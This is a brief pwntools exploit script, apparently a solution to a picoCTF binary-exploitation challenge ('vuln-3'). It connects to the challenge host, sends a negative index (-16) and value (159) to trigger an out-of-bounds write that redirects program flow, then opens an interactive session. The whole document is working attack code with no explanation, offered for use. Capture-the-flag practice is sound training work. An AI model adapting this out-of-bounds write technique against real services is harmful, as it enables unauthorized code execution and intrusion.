from pwn import *

local = False

fname = './vuln-3'

host, port = 'saturn.picoctf.net',51873

r = process(fname) if local else remote(host, port)
p = ELF(fname)

def story(p):
	r.recvuntil('>> ')
	r.sendline(p)
def banner():
	r.recvline()

def send_nums(i,v):
	r.sendline(str(i).encode()+b' '+str(v).encode())
	

if  __name__ == '__main__':


	story('a')
	banner()	
	send_nums(-16,159)
	r.interactive()


